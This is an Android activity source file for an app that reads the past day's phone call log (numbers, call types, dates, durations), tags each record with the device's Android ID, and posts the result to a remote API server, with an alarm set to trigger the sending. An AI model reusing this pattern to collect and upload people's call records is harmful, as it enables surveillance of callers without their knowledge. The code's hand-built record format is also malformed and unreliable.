package alaaMeaad.calllogs;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.icu.text.SimpleDateFormat;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Settings;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;

import java.text.DateFormat;
import java.util.Calendar;
import java.util.Date;

import alaaMeaad.calllogs.api.ApiServers;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static alaaMeaad.calllogs.api.ApiClient.getClient;

public class MainActivity extends AppCompatActivity {
    ApiServers apiServers;
    AlarmManager alarmManager;
    PendingIntent pendingIntent;
    TextView textView;
    StringBuffer sb;
    Gson gson;
    public static MainActivity mainActivity ;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mainActivity = this;
        if(ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED){
            if(ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                    Manifest.permission.READ_CALL_LOG)){
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_CALL_LOG} , 1);
            }else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.READ_CALL_LOG} , 1);
            }
        }else  {
            textView = (TextView) findViewById(R.id.textview);
            textView.setText(getCallDetails1());
        }
        apiServers = getClient().create(ApiServers.class);


        alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        Intent alarmIntent = new Intent(this, MyBroadCastReceiver.class);
        pendingIntent = PendingIntent.getBroadcast(this, 0, alarmIntent, 0);
        startAlarm();
    }



    private void startAlarm() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, 0, pendingIntent);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            alarmManager.setExact(AlarmManager.RTC_WAKEUP, 0, pendingIntent);
        } else {
            alarmManager.set(AlarmManager.RTC_WAKEUP, 0, pendingIntent);
        }


    }


    @Override
    public void onRequestPermissionsResult(int requestCode,  String[] permissions,  int[] grantResults) {
        switch (requestCode){
            case  1 : {
                if (grantResults.length >0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                    if (ContextCompat.checkSelfPermission(MainActivity.this,
                            Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED){
                        Toast.makeText(this , "Permission granted " , Toast.LENGTH_LONG).show();
                        TextView textView = (TextView) findViewById(R.id.textview);
                        textView.setText(getCallDetails1());
                    }
                }else {
                    Toast.makeText(this , "No Permission granted " , Toast.LENGTH_LONG).show();
                }
                return;
            }
        }

    }


    public String getCallDetails1() {

       sb = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";

        Date c = Calendar.getInstance().getTime();
        DateFormat simpleDateFormat = new java.text.SimpleDateFormat("yyyy-MMM-dd");
//        DateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MMM-dd");
        String formattedDate = simpleDateFormat.format(c);
        Log.e("date" , "ssss" + formattedDate);
        Date newDate = new Date(c.getTime() - 86400000L); // 7 * 24 * 60 * 60 * 1000
        Calendar calender = Calendar.getInstance();
        calender.setTime(newDate);
        String fromDate = String.valueOf(calender.getTimeInMillis());

        calender.setTime(c);
        String toDate = String.valueOf(calender.getTimeInMillis());

        String[] whereValue = {fromDate,toDate};
        Cursor managedCursor = managedQuery( CallLog.Calls.CONTENT_URI,null, android.provider.CallLog.Calls.DATE + " BETWEEN ? AND ?", whereValue, strOrder);
        int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
        int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
        int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
//        sb.append( "Call Details :");
        while ( managedCursor.moveToNext() ) {
            String phNumber = managedCursor.getString( number );
            String callType = managedCursor.getString( type );
            String callDate = managedCursor.getString( date );
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString( duration );
            String dir = null;
            int dircode = Integer.parseInt( callType );
            switch( dircode ) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            String android_id = Settings.Secure.getString(this.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
            sb.append( "{'Phone Number':'"+phNumber+"','Call Type':'"+dir+"','Call Date':'"+callDayTime+"','Phone ID':'"+ android_id+"','Call duration in sec':'"+callDuration+"},");
//            sb.append("\n----------------------------------");
        }
        managedCursor.close();

        return  sb.toString();
    }

    public String allFilds() {
//        String data = "textView.getText().toString()";
        String data = textView.getText().toString();
//        RequestBody body = RequestBody.create(okhttp3.MediaType.parse("application/json; charset=utf-8"), gson.toJson(data));


        callLogs(data);

        return data;
    }



    private void callLogs(String data) {

        apiServers.callLogs(data).enqueue(new Callback<CallLogs>() {

            @Override
            public void onResponse(Call<CallLogs> call, Response<CallLogs> response) {
                try {
                    if (response.body().getStatus().equals("success") ) {
                        Log.e("asasasas", "onReszxzxzxzponse: " );

                        Toast.makeText(MainActivity.this,"done", Toast.LENGTH_SHORT).show();

                    } else {
                        Toast.makeText(MainActivity.this,"done1", Toast.LENGTH_SHORT).show();
                        Log.e("asasasas", "onReszxzxzxzponse: " );

                    }

                } catch (Exception e) {
                    Toast.makeText(MainActivity.this,"done3", Toast.LENGTH_SHORT).show();
                    Log.e("asasasas", "onReszxzxzxzponse: " );

                }
            }

            @Override
            public void onFailure(Call<CallLogs> call, Throwable t) {
                Toast.makeText(MainActivity.this,"done4", Toast.LENGTH_SHORT).show();

            }
        });
    }
}